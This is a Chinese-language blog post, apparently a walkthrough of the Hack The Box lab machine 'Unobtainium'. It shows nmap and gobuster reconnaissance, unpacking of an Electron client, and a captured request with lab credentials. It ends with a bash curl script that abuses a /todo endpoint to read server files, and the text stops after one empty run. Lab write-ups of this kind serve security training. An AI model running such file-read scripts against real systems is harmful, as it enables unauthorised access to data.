@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Unobtainium - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - UnobtainiumHackthebox - Unobtainium 靶场实战靶场信息  靶场类型  信息搜集 首先使用nmap进行端口扫描┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.235 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unobtainium - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - UnobtainiumHackthebox - Unobtainium 靶场实战靶场信息  靶场类型  信息搜集 首先使用nmap进行端口扫描┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.235 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image7.png">
+<meta property="article:published_time" content="2021-07-17T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:54:32.972Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Unobtainium - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Unobtainium - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-07-17T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-07-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Unobtainium"><span class="post-toc-text">Hackthebox - Unobtainium</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Unobtainium-靶场实战"><span class="post-toc-text">Hackthebox - Unobtainium 靶场实战</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集-首先使用nmap进行端口扫描"><span class="post-toc-text">信息搜集 首先使用nmap进行端口扫描</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Unobtanium"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Unobtainium - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-07-17 19:38:36" datetime="2021-07-17T11:38:36.000Z"  itemprop="datePublished">2021-07-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Unobtainium"><a href="#Hackthebox-Unobtainium" class="headerlink" title="Hackthebox - Unobtainium"></a>Hackthebox - Unobtainium</h1><h1 id="Hackthebox-Unobtainium-靶场实战"><a href="#Hackthebox-Unobtainium-靶场实战" class="headerlink" title="Hackthebox - Unobtainium 靶场实战"></a>Hackthebox - Unobtainium 靶场实战</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image1.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image2.png" class>
+
+<h2 id="信息搜集-首先使用nmap进行端口扫描"><a href="#信息搜集-首先使用nmap进行端口扫描" class="headerlink" title="信息搜集 首先使用nmap进行端口扫描"></a>信息搜集 首先使用nmap进行端口扫描</h2><pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# nmap -A -sS -sC -sV -p- 10.10.10.235
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 22:08 CST
+Nmap scan report for 10.10.10.235
+Host is up (0.27s latency).
+Not shown: 65527 closed ports
+PORT      STATE SERVICE          VERSION
+22/tcp    open  ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA)
+|   256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA)
+|_  256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519)
+80/tcp    open  http             Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Unobtainium
+2379/tcp  open  ssl/etcd-client?
+| ssl-cert: Subject: commonName=unobtainium
+| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+| Not valid before: 2021-01-17T07:10:30
+|_Not valid after:  2022-01-17T07:10:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  h2
+| tls-nextprotoneg:
+|_  h2
+2380/tcp  open  ssl/etcd-server?
+| ssl-cert: Subject: commonName=unobtainium
+| Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+| Not valid before: 2021-01-17T07:10:30
+|_Not valid after:  2022-01-17T07:10:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  h2
+| tls-nextprotoneg:
+|_  h2
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Thu, 15 Jul 2021 14:50:44 GMT
+|     Content-Length: 212
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   GenericLines:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Thu, 15 Jul 2021 14:50:42 GMT
+|     Content-Length: 185
+|     {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|   HTTPOptions:
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39
+|     X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd
+|     Date: Thu, 15 Jul 2021 14:50:43 GMT
+|     Content-Length: 189
+|_    {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot options path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403}
+|_http-title: Site doesn&#39;t have a title (application/json).
+| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
+| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+| Not valid before: 2021-07-14T05:10:38
+|_Not valid after:  2022-07-15T05:10:38
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|   h2
+|_  http/1.1
+10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+| ssl-cert: Subject: commonName=unobtainium@1610865428
+| Subject Alternative Name: DNS:unobtainium
+| Not valid before: 2021-01-17T05:37:08
+|_Not valid after:  2022-01-17T05:37:08
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|   h2
+|_  http/1.1
+10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+31337/tcp open  http             Node.js Express framework
+| http-methods:
+|_  Potentially risky methods: PUT DELETE
+|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/15%Time=60F04857%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,1FF,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nCache-Control:\x20
+SF:no-cache,\x20private\r\nContent-Type:\x20application/json\r\nX-Content-
+SF:Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x203082aa7f
+SF:-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20c
+SF:4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Thu,\x2015\x20Jul\x2020
+SF:21\x2014:50:42\x20GMT\r\nContent-Length:\x20185\r\n\r\n{\&quot;kind\&quot;:\&quot;Stat
+SF:us\&quot;,\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;mes
+SF:sage\&quot;:\&quot;forbidden:\x20User\x20\\\&quot;system:anonymous\\\&quot;\x20cannot\x20ge
+SF:t\x20path\x20\\\&quot;/\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:{},\&quot;code
+SF:\&quot;:403}\n&quot;)%r(HTTPOptions,203,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nCache-C
+SF:ontrol:\x20no-cache,\x20private\r\nContent-Type:\x20application/json\r\
+SF:nX-Content-Type-Options:\x20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\
+SF:x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kubernetes-Pf-Priorityleve
+SF:l-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\nDate:\x20Thu,\x2015\x
+SF:20Jul\x202021\x2014:50:43\x20GMT\r\nContent-Length:\x20189\r\n\r\n{\&quot;ki
+SF:nd\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;metadata\&quot;:{},\&quot;status\&quot;:\&quot;Fail
+SF:ure\&quot;,\&quot;message\&quot;:\&quot;forbidden:\x20User\x20\\\&quot;system:anonymous\\\&quot;\x20c
+SF:annot\x20options\x20path\x20\\\&quot;/\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;deta
+SF:ils\&quot;:{},\&quot;code\&quot;:403}\n&quot;)%r(FourOhFourRequest,21A,&quot;HTTP/1\.0\x20403\x2
+SF:0Forbidden\r\nCache-Control:\x20no-cache,\x20private\r\nContent-Type:\x
+SF:20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Kubernete
+SF:s-Pf-Flowschema-Uid:\x203082aa7f-e4b1-444a-a726-829587cd9e39\r\nX-Kuber
+SF:netes-Pf-Prioritylevel-Uid:\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\r\n
+SF:Date:\x20Thu,\x2015\x20Jul\x202021\x2014:50:44\x20GMT\r\nContent-Length
+SF::\x20212\r\n\r\n{\&quot;kind\&quot;:\&quot;Status\&quot;,\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;metadata\&quot;
+SF::{},\&quot;status\&quot;:\&quot;Failure\&quot;,\&quot;message\&quot;:\&quot;forbidden:\x20User\x20\\\&quot;syst
+SF:em:anonymous\\\&quot;\x20cannot\x20get\x20path\x20\\\&quot;/nice\x20ports,/Trinit
+SF:y\.txt\.bak\\\&quot;\&quot;,\&quot;reason\&quot;:\&quot;Forbidden\&quot;,\&quot;details\&quot;:{},\&quot;code\&quot;:403}
+SF:\n&quot;)%r(GenericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+SF:\x20Bad\x20Request&quot;);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=7/15%OT=22%CT=1%CU=43753%PV=Y%DS=2%DC=T%G=Y%TM=60F048D
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
+OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   271.92 ms 10.10.14.1
+2   271.99 ms 10.10.10.235
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1914.83 seconds
+</code></pre>
+<p>从上面的扫描结果，我们可以得到几个关键信息 - 本台靶机开启了<code>22</code>，<code>80</code>，<code>2379</code>，<code>2380</code>，<code>8443</code>，<code>10250</code>，<code>10256</code>，<code>31337</code>端口 - 其中<code>80</code>，<code>2379</code>，<code>2380</code>，<code>8443</code>，<code>10250</code>，<code>10256</code>，<code>31337</code>都是http服务 - <code>8443</code>端口给出了两个关键信息 <code>/nice</code> <code>/Trinity.txt.bak</code> - <code>31337</code>端口存在<code>PUT</code>和<code>DELETE</code>风险</p>
+<p>咱们先去80端口看看</p>
+<pre><code class="Plain">http://10.10.10.235/
+</code></pre>
+<img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image3.png" class>
+
+<p>它声称这是一个聊天程序，并给了三个下载地址，咱们给它下载下来，同时FUZZ一下目录</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# gobuster dir -u http://10.10.10.235 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.235
+[+] Method:                  GET
+[+] Threads:                 200
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php,html
+[+] Timeout:                 10s
+===============================================================
+2021/07/16 16:33:21 Starting gobuster in directory enumeration mode
+===============================================================
+/.htpasswd.php        (Status: 403) [Size: 277]
+/.hta                 (Status: 403) [Size: 277]
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.hta.txt             (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd.txt        (Status: 403) [Size: 277]
+/.hta.php             (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htaccess.txt        (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.hta.html            (Status: 403) [Size: 277]
+/LICENSE.txt          (Status: 200) [Size: 17128]
+/README.txt           (Status: 200) [Size: 711]
+/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.10.235/assets/]
+/downloads            (Status: 301) [Size: 316] [--&gt; http://10.10.10.235/downloads/]
+/index.html           (Status: 200) [Size: 1988]
+/index.html           (Status: 200) [Size: 1988]
+/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.235/images/]
+/server-status        (Status: 403) [Size: 277]
+
+===============================================================
+2021/07/16 16:33:58 Finished
+===============================================================
+</code></pre>
+<p>当fuzz完的时候，三个文件也下载完了，咱们去看一下</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Downloads]
+└─# ls
+unobtainium_debian.zip  unobtainium_redhat.zip  unobtainium_snap.zip
+</code></pre>
+<p>让我们提取deb包中的文件，而不安装它</p>
+<pre><code class="Plain">mkdir test
+unzip unobtainium_debian.zip
+dpkg-deb -xv unobtainium_1.0.0_amd64.deb test
+cd test
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Downloads/test]
+└─# tree
+.
+├── opt
+│   └── unobtainium
+│       ├── chrome_100_percent.pak
+│       ├── chrome_200_percent.pak
+│       ├── chrome-sandbox
+│       ├── icudtl.dat
+│       ├── libEGL.so
+│       ├── libffmpeg.so
+│       ├── libGLESv2.so
+│       ├── libvk_swiftshader.so
+│       ├── libvulkan.so
+│       ├── LICENSE.electron.txt
+│       ├── LICENSES.chromium.html
+│       ├── locales
+│       │   ├── am.pak
+│       │   ├── ar.pak
+│       │   ├── bg.pak
+│       │   ├── bn.pak
+│       │   ├── ca.pak
+│       │   ├── cs.pak
+│       │   ├── da.pak
+│       │   ├── de.pak
+│       │   ├── el.pak
+│       │   ├── en-GB.pak
+│       │   ├── en-US.pak
+│       │   ├── es-419.pak
+│       │   ├── es.pak
+│       │   ├── et.pak
+│       │   ├── fa.pak
+│       │   ├── fil.pak
+│       │   ├── fi.pak
+│       │   ├── fr.pak
+│       │   ├── gu.pak
+│       │   ├── he.pak
+│       │   ├── hi.pak
+│       │   ├── hr.pak
+│       │   ├── hu.pak
+│       │   ├── id.pak
+│       │   ├── it.pak
+│       │   ├── ja.pak
+│       │   ├── kn.pak
+│       │   ├── ko.pak
+│       │   ├── lt.pak
+│       │   ├── lv.pak
+│       │   ├── ml.pak
+│       │   ├── mr.pak
+│       │   ├── ms.pak
+│       │   ├── nb.pak
+│       │   ├── nl.pak
+│       │   ├── pl.pak
+│       │   ├── pt-BR.pak
+│       │   ├── pt-PT.pak
+│       │   ├── ro.pak
+│       │   ├── ru.pak
+│       │   ├── sk.pak
+│       │   ├── sl.pak
+│       │   ├── sr.pak
+│       │   ├── sv.pak
+│       │   ├── sw.pak
+│       │   ├── ta.pak
+│       │   ├── te.pak
+│       │   ├── th.pak
+│       │   ├── tr.pak
+│       │   ├── uk.pak
+│       │   ├── vi.pak
+│       │   ├── zh-CN.pak
+│       │   └── zh-TW.pak
+│       ├── resources
+│       │   └── app.asar
+│       ├── resources.pak
+│       ├── snapshot_blob.bin
+│       ├── swiftshader
+│       │   ├── libEGL.so
+│       │   └── libGLESv2.so
+│       ├── unobtainium
+│       ├── v8_context_snapshot.bin
+│       └── vk_swiftshader_icd.json
+└── usr
+    └── share
+        ├── applications
+        │   └── unobtainium.desktop
+        ├── doc
+        │   └── unobtainium
+        │       └── changelog.gz
+        └── icons
+            └── hicolor
+                ├── 128x128
+                │   └── apps
+                │       └── unobtainium.png
+                ├── 16x16
+                │   └── apps
+                │       └── unobtainium.png
+                ├── 256x256
+                │   └── apps
+                │       └── unobtainium.png
+                ├── 32x32
+                │   └── apps
+                │       └── unobtainium.png
+                ├── 48x48
+                │   └── apps
+                │       └── unobtainium.png
+                └── 64x64
+                    └── apps
+                        └── unobtainium.png
+
+24 directories, 80 files
+</code></pre>
+<p>在<code>/test/opt/unobtainium</code>中，有一个名为<code>unobtainium</code>的可执行文件，让我们执行它</p>
+<pre><code class="Plain">./unobtainium --no-sandbox
+</code></pre>
+<p>得到了错误</p>
+<img src="/2021/07/17/Hackthebox/Hackthebox-Unobtanium/image4.png" class>
+
+<p>让我们添加一下域名</p>
+<pre><code class="Plain">echo 10.10.10.235 unobtainium.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后再执行一次</p>
+<p>这次运行正常了</p>
+<p>当我使用<code>Wireshark</code>监听tun0的时候，在<code>Unobtainium Chat</code>中点击<code>Todo</code>即可捕捉到流量包</p>
+<pre><code class="Plain">POST /todo HTTP/1.1
+Host: unobtainium.htb:31337
+Connection: keep-alive
+Content-Length: 73
+Accept: application/json, text/javascript, */*; q=0.01
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36
+Content-Type: application/json
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN
+
+{&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;todo.txt&quot;}HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 293
+ETag: W/&quot;125-tNs2+nU0UiQGmLreBy4Pj891aVA&quot;
+Date: Fri, 16 Jul 2021 09:49:16 GMT
+Connection: keep-alive
+Keep-Alive: timeout=5
+
+{&quot;ok&quot;:true,&quot;content&quot;:&quot;1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n&quot;}
+</code></pre>
+<p>似乎Todo函数具有从服务器读取文件的能力。</p>
+<p>我找到一个脚本来检查是否可以从服务器读取文件。</p>
+<p>我还运行了Burp来捕获请求 ## 漏洞利用 在运行脚本之前，我们需要安装需要的环境</p>
+<pre><code class="Plain">apt-get install jq
+</code></pre>
+<pre><code class="Plain">#!/bin/bash
+
+RHOST=&quot;unobtainium.htb&quot;
+RPORT=31337
+UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot;
+PROXY=&quot;127.0.0.1:8080&quot;
+FILE=$1
+
+cat - &lt;&lt;EOF &gt; message.json
+{
+    &quot;auth&quot;:
+    {
+        &quot;name&quot;:&quot;felamos&quot;,
+        &quot;password&quot;:&quot;Winter2021&quot;
+    },
+    &quot;filename&quot;:&quot;${FILE}&quot;
+}
+EOF
+
+CONTENT=&quot;$(curl -s \
+                -A &quot;${UA}&quot; \
+                -H &quot;Content-Type: application/json&quot; \
+                -d &quot;$(cat message.json | jq -c)&quot; \
+                -x &quot;${PROXY}&quot; \
+                http://${RHOST}:${RPORT}/todo \
+           | jq .content \
+           | sed -e &#39;s/^.//&#39; -e &#39;s/.$//&#39;)&quot;
+
+printf &quot;$CONTENT&quot;
+</code></pre>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# ./read.sh
+
+┌──(root💀root)-[~/Desktop]
+└─# cat message.json
+{
+    &quot;auth&quot;:
+    {
+        &quot;name&quot;:&quot;felamos&quot;,
+        &quot;password&quot;:&quot;Winter2021&quot;
+    },
+    &quot;filename&quot;:&quot;&quot;
+}
